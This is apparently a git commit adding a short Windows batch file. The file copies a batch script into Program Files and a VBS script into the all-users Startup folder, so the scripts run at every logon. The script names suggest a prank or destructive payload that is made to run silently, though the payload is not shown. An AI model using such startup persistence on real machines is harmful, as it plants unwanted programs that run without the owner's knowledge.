9b6293fa6473f2ae79029dfe763fc385c0ef0760
kamieniolub <44553199+kamieniolub@users.noreply.github.com>
2022-03-31 22:19:25 +0200

    Add files via upload

---
+++ braklola/autocopy.bat
@@ -0,0 +1,4 @@
+@echo off
+xcopy /Y "C:\braklola\niszczycielzabawy.bat" "C:\Program Files"
+xcopy /Y "C:\braklola\znikaniebatu.vbs" "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
+pause
